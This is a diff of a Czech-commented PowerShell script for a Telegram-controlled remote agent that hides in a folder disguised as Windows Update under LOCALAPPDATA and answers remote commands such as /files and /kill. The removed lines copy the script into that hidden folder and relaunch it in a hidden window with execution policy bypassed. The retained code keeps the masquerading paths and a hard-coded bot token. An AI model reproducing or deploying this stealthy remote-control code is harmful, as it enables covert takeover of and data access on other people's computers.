@@ -4,45 +4,12 @@
 
 $botToken = '8510265210:AAH9HMaiR1ineEhf4SHtZBCaiO1HBPbcYTw'
 
-# SKRYTÁ SLOŽKA
-$targetFolder = "$env:LOCALAPPDATA\Microsoft\WindowsUpdate"
-$targetScript = "$targetFolder\WuUpdate.ps1"
-$stateFile = "$targetFolder\.state"
-$logFile = "$targetFolder\.log"
+# CESTY K SOUBORŮM - agent očekává že složka už existuje
+$agentFolder = "$env:LOCALAPPDATA\Microsoft\WindowsUpdate"
+$stateFile = "$agentFolder\.state"
+$logFile = "$agentFolder\.log"
 
 $chatId = $null
-
-# INSTALACE - pokud neběžíme z cílové složky
-try {
-    $currentPath = if($PSCommandPath) { $PSCommandPath } else { $null }
-    
-    if($currentPath -and $currentPath -ne $targetScript) {
-        # Vytvoř složku
-        if(!(Test-Path $targetFolder)) {
-            New-Item -ItemType Directory -Path $targetFolder -Force | Out-Null
-        }
-        
-        # Nastav Hidden
-        try {
-            $folder = Get-Item $targetFolder -Force
-            $folder.Attributes = 'Hidden'
-        } catch {}
-        
-        # Zkopíruj se
-        Copy-Item -Path $currentPath -Destination $targetScript -Force -ErrorAction Stop
-        
-        # Spusť kopii
-        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$targetScript`""
-        
-        # Ukonči se
-        exit
-    }
-} catch {
-    # Pokud instalace selže, pokračuj z aktuálního místa
-    Write-Host "Instalace selhala, pokracuji z aktualniho mista: $_"
-}
-
-# FUNKCE AGENTA
 
 function Write-Log($msg) {
     try {
@@ -54,7 +21,7 @@ function Write-Log($msg) {
 
 Write-Log "=== AGENT START ==="
 
-# Načti stav
+# Načti uložený stav (pokud existuje)
 if(Test-Path $stateFile) {
     try {
         $savedState = Get-Content $stateFile -Raw -Encoding UTF8 | ConvertFrom-Json
@@ -182,22 +149,20 @@ while($true) {
                     Send-Message "Log soubor neexistuje"
                 }
             } elseif($cmd -eq '/files') {
-                $currentLoc = if($PSCommandPath) { $PSCommandPath } else { "neznama (spusteno z pameti)" }
                 $info = "Umisteni souboru:`n"
-                $info += "Aktualni lokace: $currentLoc`n"
-                $info += "Cilova lokace: $targetScript`n"
+                $info += "Agent: $agentFolder\WuUpdate.ps1`n"
                 $info += "State: $stateFile`n"
                 $info += "Log: $logFile`n`n"
-                $info += "Slozka: $targetFolder"
+                $info += "Slozka: $agentFolder (Hidden)"
                 Send-Message $info
             } elseif($cmd -eq '/kill') {
                 Write-Log "Ukoncuji se..."
                 Send-Message "Agent se ukoncuje..."
                 
-                Remove-Item $targetScript -Force -ErrorAction SilentlyContinue
+                Remove-Item "$agentFolder\WuUpdate.ps1" -Force -ErrorAction SilentlyContinue
                 Remove-Item $stateFile -Force -ErrorAction SilentlyContinue
                 Remove-Item $logFile -Force -ErrorAction SilentlyContinue
-                Remove-Item $targetFolder -Force -ErrorAction SilentlyContinue
+                Remove-Item $agentFolder -Force -ErrorAction SilentlyContinue
                 
                 exit
             } else {
